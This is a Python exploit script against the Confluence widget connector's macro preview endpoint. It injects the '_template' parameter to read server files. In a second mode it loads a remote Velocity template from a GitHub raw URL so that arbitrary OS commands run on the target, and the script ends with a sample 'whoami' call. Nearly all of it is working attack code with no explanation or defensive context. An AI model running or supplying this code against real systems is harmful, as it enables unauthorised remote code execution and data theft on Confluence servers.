
import requests


from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def scan(url0,payload,cmd=''):
    url=url0.rstrip('/') if 'http'==url0[:4] else 'http://'+url0.rstrip('/')
    filename = payload
    limitSize = 1000
    paylaod = url + "/rest/tinymce/1/macro/preview"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Referer": url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
        "Connection": "close",
        "Content-Type": "application/json; charset=utf-8"
    }
    if not cmd:
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
    else:
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/shad0w008/selenium/master/cmds.vm","command":"%s"}}}' % cmd
    try:
        r = requests.post(paylaod, data=data, headers=headers, verify=False,timeout=60)
        if r.status_code == 200:
            #print(repr(r.content))
            content=r.content.split('<div class="wiki-content">')[-1].split('</div>')[0]
            if content:
                print(content.strip())
    except Exception as e:
        print(e)


scan('https://www.target.com/','12345',cmd='whoami')
